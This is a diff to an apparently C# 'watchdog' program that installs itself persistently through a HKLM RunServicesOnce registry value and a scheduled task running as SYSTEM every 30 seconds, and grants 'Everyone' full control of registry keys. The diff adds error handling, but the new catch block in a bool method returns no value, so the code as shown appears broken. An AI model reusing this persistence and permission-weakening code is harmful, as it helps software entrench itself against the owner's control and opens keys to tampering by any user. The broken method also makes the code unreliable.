@@ -11,6 +11,7 @@ using System.IO;
 
         public static void runAllTechniques()
         {
+            //CurrentUser keys dont run as System and are not in use
 
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
             //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
@@ -57,6 +58,8 @@ using System.IO;
 
         static bool TaskExistsAndActive(string taskName)
         {
+        try
+        {
             Process process = new Process();
             process.StartInfo.FileName = "schtasks";
             process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
@@ -71,9 +74,15 @@ using System.IO;
             // Check if the task exists and is active
             return output.Contains(taskName) && output.Contains("Status: Ready");
         }
+        catch (Exception ex) { 
+            watchdogHelper.Log($"Error verifying task exists and active: {ex.Message}");
+        }
+        }
 
         // Function to create a scheduled task to run every 30 seconds
         static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
+        {
+        try
         {
             // Create the schtasks command to run every 30 seconds
             string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59 /RU SYSTEM"; //sets system permissions
@@ -86,6 +95,10 @@ using System.IO;
 
             process.Start();
             process.WaitForExit();
+        }
+        catch (Exception ex) {
+            watchdogHelper.Log($"Error creating scheduled task: {ex.Message}");
+        }
         }
 
         public static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
@@ -152,7 +165,7 @@ using System.IO;
                 // Apply the modified security settings to the key
                 rootKey.SetAccessControl(registrySecurity);
 
-                watchdogHelper.Log($"Successfully granted 'Everyone' full control and enabled inheritance on {registryHive}.");
+                watchdogHelper.Log($"Successfully granted 'Everyone' full control and enabled inheritance on {rootKey}.");
             }
             catch (UnauthorizedAccessException ex)
             {
